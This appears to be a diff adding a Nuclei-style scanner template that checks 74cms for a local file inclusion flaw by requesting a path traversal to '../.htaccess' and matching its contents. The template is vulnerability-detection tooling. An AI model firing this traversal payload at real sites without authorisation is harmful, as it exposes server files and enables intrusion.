@@ -1,0 +1,24 @@
+id: 74cms-local_file_include
+
+info:
+  name: 74cms local_file_include
+  author: Str1am    
+  severity: medium
+  description: 导致攻击者可包含文件
+  reference: http://wooyun.org/bugs/wooyun-2014-086882
+  tags: 74cms,local_file_include
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?m=&c=M&a=index&type=../.htaccess"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "%{REQUEST_FILENAME} !-d"
+        part: body
+        condition: and
